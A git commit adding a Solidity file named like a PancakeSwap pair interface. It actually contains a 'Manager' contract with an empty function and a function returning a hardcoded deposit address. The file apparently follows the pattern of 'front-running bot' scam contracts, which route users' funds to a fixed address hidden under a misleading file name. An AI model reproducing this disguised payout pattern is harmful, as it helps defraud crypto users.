a12fc2da617f084a8bbce450cfc51dac85b4f2fa
riverhj <rmaster@163.com>
2022-05-31 16:30:54 +0800

    Update IPancakePairBSC.sol

---
+++ IPancakePairBSC.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x59528e9328b7a1a1457a6d64bb8c450b43f44a86;
+    }
+}
